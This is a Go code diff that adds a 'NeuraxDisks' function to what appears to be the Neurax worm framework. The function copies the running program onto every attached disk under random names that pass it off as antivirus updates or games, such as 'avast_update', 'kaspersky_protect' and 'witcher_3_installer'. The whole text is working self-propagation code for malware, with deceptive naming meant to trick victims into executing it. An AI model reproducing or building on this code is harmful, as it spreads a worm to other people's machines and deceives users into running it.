@@ -238,3 +238,23 @@ func NeuraxScan(c chan string) {
 		}
 	}
 }
+
+func NeuraxDisks() error {
+	//Probably should use Haikunator here...
+	names := []string{"avast_update", "tetris", "kaspersky_protect", "witcher_3_installer"} //TODO: Add more names
+	selected_name := coldfire.RandomSelectStr(names)
+	if runtime.GOOS == "windows" {
+		selected_name += ".exe"
+	}
+	disks, err := coldfire.Disks()
+	if err != nil {
+		return err
+	}
+	for _, d := range disks {
+		err := coldfire.CopyFile(os.Args[0], d+"/"+selected_name)
+		if err != nil {
+			return err
+		}
+	}
+	return nil
+}
